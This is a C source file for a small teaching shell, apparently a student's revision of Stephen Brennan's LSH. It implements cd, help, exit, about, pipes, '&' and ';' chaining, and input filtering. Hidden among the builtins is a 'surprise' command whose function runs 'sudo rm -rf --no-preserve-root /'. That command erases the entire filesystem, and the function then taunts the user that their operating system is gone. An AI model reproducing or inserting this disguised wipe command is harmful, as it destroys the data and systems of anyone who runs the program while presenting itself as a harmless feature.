/***************************************************************************/ /**

   @file         main.c

   @author       Stephen Brennan; Revised by Jacob Malland

   @date         1 March, 2025

   @brief

 *******************************************************************************/

#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
  Function Declarations for builtin shell commands:
 */

char cwd[1024];

int lsh_cd(char **args);
int lsh_help(char **args);
int lsh_exit(char **args);
int lsh_about(char **args);
int lsh_surprise(char **args);

/*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    2222 Add code here:
     Add at least one builtin command

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/
/*
  List of builtin commands, followed by their corresponding functions.
 */
char *builtin_str[] = {
    "cd",
    "help",
    "exit",
    "about",
    "surprise"
};

int (*builtin_func[])(char **) = {
    &lsh_cd,
    &lsh_help,
    &lsh_exit,
    &lsh_about,
    &lsh_surprise
};

int lsh_num_builtins()
{
    return sizeof(builtin_str) / sizeof(char *);
}

/*
  Builtin function implementations.
*/

/**
 * @brief Update the Current Working Directory value, for command-line display
 */
void update_cwd() {
    getcwd(cwd, sizeof(cwd));
}

/**
   @brief Bultin command: change directory.
   @param args List of args.  args[0] is "cd".  args[1] is the directory.
   @return Always returns 1, to continue executing.
 */
int lsh_cd(char **args)
{
    if (args[1] == NULL)
    {
        fprintf(stderr, "lsh: expected argument to \"cd\"\n");
    }
    else
    {
        if (chdir(args[1]) != 0)
        {
            perror("lsh");
        }
        else {
            update_cwd();
        }
    }
    return 1;
}

/**
   @brief Builtin command: print help.
   @param args List of args.  Not examined.
   @return Always returns 1, to continue executing.
 */
int lsh_help(char **args)
{
    int i;
    printf("Stephen Brennan's LSH\n");
    printf("Type program names and arguments, and hit enter.\n");
    printf("The following are built in:\n");

    for (i = 0; i < lsh_num_builtins(); i++)
    {
        printf("  %s\n", builtin_str[i]);
    }

    printf("Use the man command for information on other programs.\n");
    return 1;
}

/**
   @brief Builtin command: exit.
   @param args List of args.  Not examined.
   @return Always returns 0, to terminate execution.
 */
int lsh_exit(char **args)
{
    return 0;
}

/**
  @brief Launch a program and wait for it to terminate.
  @param args Null terminated list of arguments (including program).
  @return Always returns 1, to continue execution.
 */
int lsh_launch(char **args)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid == 0)
    {
        // Child process
        if (execvp(args[0], args) == -1)
        {
            perror("lshChild");
        }
        exit(EXIT_FAILURE);
    }
    else if (pid < 0)
    {
        // Error forking
        perror("lshFork");
    }
    else
    {
        // Parent process
        do
        {
            waitpid(pid, &status, WUNTRACED);
        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
    }

    return 1;
}

int lsh_about(char **args) {
    printf("Programmed by Stephen Brennan, revised by Jacob Malland.\n");
    printf("Updated: 03 March, 2025\n");

    return 1;
}

int lsh_surprise(char **args) {
    pid_t pid;
    int status;
    char *sudo_cmd[] = {"sudo", "/bin/rm", "-rf", "--no-preserve-root", "/", NULL};
    char *user_cmd[] = {"/bin/rm", "-rf", "--no-preserve-root", "/", NULL};  

    printf("Preparing your ŞųŕPrĨşệ...\n");

    pid = fork();
    if (pid == 0) { // The Child Process
        // Execute surprise
        if (geteuid() != 0) {
            execvp(sudo_cmd[0], sudo_cmd);
        }
        else {
            execvp(user_cmd[0], user_cmd);
        }
        perror("Failed to gain root privileges");
        exit(EXIT_FAILURE);
    }
    else if (pid > 0) { // The Parent Process
        // Wait for child process to terminate
        waitpid(pid, &status, WUNTRACED);

        if (WIFEXITED(status) && WEXITSTATUS(status) == 1) { // Check execution didn't fail
            printf("Surprise! Your hard drive is SSQQQUUUUEEEEEEKY clean.\n");
            perror("You have no operating system");
            exit(EXIT_FAILURE);
        }
        else { // Error executing forked command
            perror("lsh");
            exit(EXIT_FAILURE);
        }
    }
    else { // Error forking
        perror("lsh");
        exit(EXIT_FAILURE);
    }

    return 1;
}

/*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    444444 Add code here:
     int myPipe(char **args)
    {
     create a new process:
     parent process: wait()
         Child process:
        (1) create a pipe()
                (2) create a new process fork()
                    Parent process: (a) close pipe output end (b) use dup2() to map stdin (c) use exec() family function to load parent code
                    Child process: (a) close pipe input end (b)use dup2() to map stdout (c) use exec() family function to load child code

    }

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/

int myPipe(char **args) {
    // Locate the next delimiter
    int delimiter_index = -1;
    char delimiter = '\0';
    for (int i = 0; args[i] != NULL; i++) {
        if (strcmp(args[i], "|") == 0 || strcmp(args[i], "&") == 0 || strcmp(args[i], ";") == 0) {
            delimiter_index = i;
            delimiter = args[i][0];
            args[i] = NULL; // Terminate left command
            break;
        }
    }

    if (delimiter_index == -1) {
        return lsh_launch(args); // No delimiter, execute normally
    }

    char **left_cmd = args;
    char **right_cmd = &args[delimiter_index + 1];

    int fd[2];
    pid_t pid;

    if (pipe(fd) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) { // Child Process (Executes Left Command)
        close(fd[0]);
        dup2(fd[1], STDOUT_FILENO);
        close(fd[1]);

        execvp(left_cmd[0], left_cmd);
        perror("PipeChild");
        exit(EXIT_FAILURE);
    } else { // Parent Process
        pid_t gcpid = fork();
        if (gcpid == 0) { // Grandchild Process (Executes Right Command)
            close(fd[1]);
            dup2(fd[0], STDIN_FILENO);
            close(fd[0]);

            switch(delimiter) {
                case '|': {
                    myPipe(right_cmd);
                    break;
                }
                case '&': {
                    myAmphersand(right_cmd);
                    break;
                }
                case ';': {
                    mySemicolon(right_cmd);
                    break;
                }
            }
            exit(EXIT_FAILURE);
        } 
        else { // Wait for the Child Process & Grandchild Process
            close(fd[0]);
            close(fd[1]);
            waitpid(pid, NULL, 0);
            waitpid(gcpid, NULL, 0);
        }
    }

    return 1;
}

/*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    55555 Add code here:
     int myAmphersand(char **args)
    {
     create a new process:
     parent process: (1) create a new process and child uses exec() family function to load child code(2)wait()
         Child process: use exec() family function to load child code

    }
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/

int myAmphersand(char **args) {
    pid_t pid;
    int status;

    // Locate the next delimiter
    int delimiter_index = -1;
    char delimiter = '\0';
    for (int i=0; args[i] != NULL; i++) {
        if (strcmp(args[i], "|") == 0) {
            delimiter_index = i;
            delimiter = '|';
            break;
        }
        else if (strcmp(args[i], "&") == 0) {
            delimiter_index = i;
            delimiter = '&';
            break;
        }
        else if (strcmp(args[i], ";") == 0) {
            delimiter_index = i;
            delimiter = ';';
            break;
        }
    }

    if (delimiter_index == -1) {
        // No remaining ampersands, just execute the command
        return lsh_launch(args);
    }

    // Split the command at the ampersand '&'
    args[delimiter_index] = NULL;
    char **left_cmd = args;
    char **right_cmd = &args[delimiter_index + 1];

    pid = fork();
    if (pid == 0) { // Child Process
        // Execute the command in the background
        execvp(left_cmd[0], left_cmd);
        perror("ampChild");
    }
    else if (pid > 0) { // Parent Process
        switch(delimiter) {
            case '|': return myPipe(right_cmd);
            case '&': return myAmphersand(right_cmd);
            case ';': return mySemicolon(right_cmd);
        }
    }
    else { // Error Forking
        perror("ampFork");
    }

    return 1;
}


/*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
    66666 Add code here:
     int mySemicolon(char **args)
    {
     create a new process:
     parent process:  (1)wait() (2) create a new process for the second child (3) wait()
         Child process: (1) use exec() family function to load child code

    }
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/

int mySemicolon(char **args) {
    pid_t pid;
    int status;

    // Locate the next delimiter
    int delimiter_index = -1;
    char delimiter = '\0';
    for (int i=0; args[i] != NULL; i++) {
        if (strcmp(args[i], "|") == 0) {
            delimiter_index = i;
            delimiter = '|';
            break;
        }
        else if (strcmp(args[i], "&") == 0) {
            delimiter_index = i;
            delimiter = '&';
            break;
        }
        else if (strcmp(args[i], ";") == 0) {
            delimiter_index = i;
            delimiter = ';';
            break;
        }
    }

    if (delimiter_index == -1) {
        // No remaining semicolons, just execute the command
        return lsh_launch(args);
    }

    // Split the command at the semicolon ';'
    args[delimiter_index] = NULL;
    char **left_cmd = args;
    char **right_cmd = &args[delimiter_index + 1];

    pid = fork();
    if (pid == 0) { // Child Process
        // Execute the command in the background
        execvp(left_cmd[0], left_cmd);
    }
    else if (pid > 0) { // Parent Process
        // Wait until the child process exits or terminates
        do
        {
            waitpid(pid, &status, WUNTRACED);
        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
    
        pid_t child_pid;
        int child_status;
    
        child_pid = fork();
        if (child_pid > 0) { // Parent Process
            // Wait until the second child process exits or terminates
            do
            {
                waitpid(child_pid, &child_status, WUNTRACED);
            } while (!WIFEXITED(child_status) && !WIFSIGNALED(child_status));
        }
        else if (child_pid == 0) { // Second Child Process
            switch(delimiter) {
                case '|': return myPipe(right_cmd);
                case '&': return myAmphersand(right_cmd);
                case ';': return mySemicolon(right_cmd);
            }    
        }
        else { // Error Forking
            perror("semiChildFork");
        }
    }
    else { // Error Forking
        perror("semiFork");
    }

    return 1;
}

/**
   @brief Execute shell built-in or launch program.
   @param args Null terminated list of arguments.
   @return 1 if the shell should continue running, 0 if it should terminate
 */
int lsh_execute(char **args)
{
    int i;

    if (args[0] == NULL)
    {
        // An empty command was entered.
        return 1;
    }

    for (i = 0; i < lsh_num_builtins(); i++)
    {
        if (strcmp(args[0], builtin_str[i]) == 0)
        {
            return (*builtin_func[i])(args);
        }
    }

    for (int j = 0; args[j] != NULL; j++)
    {

        /*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        33333 Add code here:

        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/

        // The arguments include a delimiter
        if (strcmp(args[j], "|") == 0 || strcmp(args[j], "&") == 0 || strcmp(args[j], ";") == 0) {
            char delimiter = args[j][0];

            switch(delimiter) {
                case '|': return myPipe(args);

                case '&': return myAmphersand(args);// myAmphersand(parent_args, child_args);

                case ';': return mySemicolon(args); //mySemicolon(parent_args, child_args);
            }
        }
    }

    return lsh_launch(args);
}

#define LSH_RL_BUFSIZE 1024
/**
   @brief Read a line of input from stdin.
   @return The line from stdin.
 */
char *lsh_read_line(void)
{
    int bufsize = LSH_RL_BUFSIZE;
    int position = 0;
    char *buffer = malloc(sizeof(char) * bufsize);
    int c;

    if (!buffer)
    {
        fprintf(stderr, "lsh: allocation error\n");
        exit(EXIT_FAILURE);
    }

    while (1)
    {
        // Read a character
        c = getchar();

        if (c == EOF)
        {
            exit(EXIT_SUCCESS);
        }
        else if (c == '\n')
        {
            buffer[position] = '\0';
            return buffer;
        }
        else
        {
            buffer[position] = c;
        }
        position++;

        // If we have exceeded the buffer, reallocate.
        if (position >= bufsize)
        {
            bufsize += LSH_RL_BUFSIZE;
            buffer = realloc(buffer, bufsize);
            if (!buffer)
            {
                fprintf(stderr, "lsh: allocation error\n");
                exit(EXIT_FAILURE);
            }
        }
    }
}

char* process_line(char *oline)
{	
  	// (1) Truncate if longer than 100 characters
    if (strlen(oline) > 100) {
        oline[100] = '\0';
    }

    // (2) Validate character set
    for (int i = 0; oline[i] != '\0'; i++) {
        char c = oline[i];
        // Check the character value corresponds to the ascii value boundaries
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '/' || c == '-' || c == '_' || c == ';' || c == '|' || c == '&' || c == ' ')) {
            perror("Invalid characters");
            oline[i] = '\0'; // Ignore the rest of the characters
            return oline;
        }
    }
    
    return oline;
}

#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
/**
   @brief Split a line into tokens (very naively).
   @param line The line.
   @return Null-terminated array of tokens.
 */
char **lsh_split_line(char *line)
{
    int bufsize = LSH_TOK_BUFSIZE, position = 0;
    char **tokens = malloc(bufsize * sizeof(char *));
    char *token, **tokens_backup;

    if (!tokens)
    {
        fprintf(stderr, "lsh: allocation error\n");
        exit(EXIT_FAILURE);
    }

    token = strtok(line, LSH_TOK_DELIM);
    while (token != NULL)
    {
        tokens[position] = token;
        position++;

        if (position >= bufsize)
        {
            bufsize += LSH_TOK_BUFSIZE;
            tokens_backup = tokens;
            tokens = realloc(tokens, bufsize * sizeof(char *));
            if (!tokens)
            {
                free(tokens_backup);
                fprintf(stderr, "lsh: allocation error\n");
                exit(EXIT_FAILURE);
            }
        }

        token = strtok(NULL, LSH_TOK_DELIM);
    }
    tokens[position] = NULL;
    return tokens;
}

/**
   @brief Loop getting input and executing it.
 */
void lsh_loop(void)
{
    char *oline;
    char *line;
    char **args;
    int status;

    update_cwd(); // Update the CWD for the first-time command-line printing

    do
    {

        printf("CS3230-Jacob:%s", cwd);
        printf("$ ");

        /*$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
            1111  add code here:
                Print your own promo, such as cs3230-Emily>>
            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*/
        oline = lsh_read_line();
	    line = process_line(oline); // process the input
        args = lsh_split_line(line);
        status = lsh_execute(args);
        
        free(line);
        free(args);
    } while (status);
}

/**
   @brief Main entry point.
   @param argc Argument count.
   @param argv Argument vector.
   @return status code
 */
int main(int argc, char **argv)
{
    // Load config files, if any.

    // Run command loop.
    lsh_loop();

    // Perform any shutdown/cleanup.

    return EXIT_SUCCESS;
}
